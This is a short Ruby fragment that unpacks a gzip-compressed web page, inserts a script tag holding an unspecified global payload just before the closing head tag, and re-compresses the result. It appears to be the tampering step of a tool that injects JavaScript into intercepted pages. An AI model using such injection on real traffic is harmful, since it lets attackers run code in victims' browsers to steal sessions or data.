
def gunzip
	File.open('tmp.gz') do |f|
	  gz = Zlib::GzipReader.new(f)
	  File.open('outfile.gz', 'w'){|f| f.puts gz.read; f.close}
	  gz.close
	end
	gzip
end
def gzip
	page = File.open('outfile.gz').read
	page = page.gsub('</head>', "<script> #{$script} </script></head>")
	File.open('infile.gz', 'w') do |f|
	  gz = Zlib::GzipWriter.new(f)
	  gz.write page
	  gz.close
	end
end
